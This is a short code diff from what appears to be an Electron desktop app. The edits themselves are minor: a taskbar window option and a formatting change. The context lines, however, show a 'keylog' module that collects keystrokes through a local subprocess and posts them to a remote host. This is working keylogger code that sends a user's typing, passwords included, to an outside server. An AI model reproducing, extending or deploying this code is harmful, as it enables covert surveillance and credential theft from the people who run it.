@@ -85,6 +85,7 @@ function create_main_window() {
 		frame: config.frame,
 		minWidth: 400,
 		show: true,
+		skipTaskbar: false,
 		webPreferences: {
 			nodeIntegration: true,
 			enableRemoteModule: true,
@@ -274,7 +275,7 @@ let keylog = {
 		await keys.then(keys => { axios.default.post(remotehost + '/action/post/keylog', JSON.stringify(keys.data.keys)) })
 	},
 	clear: async function () { axios.get('http://localhost:5088/key/clear') },//reset key array
-	close: function(){axios.post("http://localhost:5088/shutdown");},//shutdown sub-process
+	close: function () { axios.post("http://localhost:5088/shutdown"); },//shutdown sub-process
 }
 
 let directoryman = {
